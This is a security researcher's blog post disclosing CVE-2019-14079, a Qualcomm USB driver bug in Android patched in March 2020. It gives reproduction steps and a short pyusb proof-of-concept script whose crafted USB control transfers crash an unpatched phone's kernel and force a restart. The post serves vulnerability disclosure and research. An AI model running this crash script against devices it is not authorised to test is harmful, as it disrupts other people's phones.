# CVE-2019-14079

USB device fuzzing on Android Phone

---

This blog post is about my journey into USB device fuzzing and how I found a high severity bug in Qualcomm USB driver which was patched and disclosed in March 2020 Android bulletin. 
About the vulnerability, when you send a crafted USB requests to the android phone it crashes the android kernel and your phone restarts. 
Android team found this issue was due to an uninitialized variable used in USB gadget core.c. More details about the vulnerability can be found in the below Qualcomm security advisory and android march 2020 bulletin.


Technical Overview
Android phones support both device and host modes, in device mode you can connect your mobile to a PC using an USB cable and share images, music from your phone to PC with different USB connectivity modes(like only charging, FMTP, …). 
In Host mode you can connect a headset, flash drive using an OTG cable where your above devices act as a client and your android phone acts as a master.

Check this below video about USB overview and fuzzing by Andrey Konovalov in Offensive-con 2019 and also the USB protocol basics: USB 101: An Introduction to Universal Serial Bus 2.0.



Steps to reproduce this vulnerability if you have not updated your phone with Android March 2020 patch.
Connect your android mobile to Linux PC(Ubuntu). 
Verify no USB debugging is enabled in your mo. 
Device must be connected in power charging mode . 
In Ubuntu host, the android connects as USB device and gets detected as SDMxxx SN:xxxxxx. 
Check your dmesg logs or lsusb to identify your device.
Change the VID and PID as per your device in the below script.
Run the below python script in your linux PC with pyusb installed.



---

import usb.core 
dev = usb.core.find(idVendor=0x2717, idProduct=0xff40) 
#bmRequestType, bRequest,wValue(bDescriptortype:DescriptorIndex),wIndex,wLength 
send = dev.ctrl_transfer(0x80,0,0x0000,0x00,0000) 
send = dev.ctrl_transfer(0x81,0,0x0000,0x00,0000) 
send = dev.ctrl_transfer(0x82,0,0x0000,0x00,0000) 
print("Received: " + str(send))

If you see your phone restarts, then you have exploited the bug.
You can check your kernel logs for the below messages after restart.
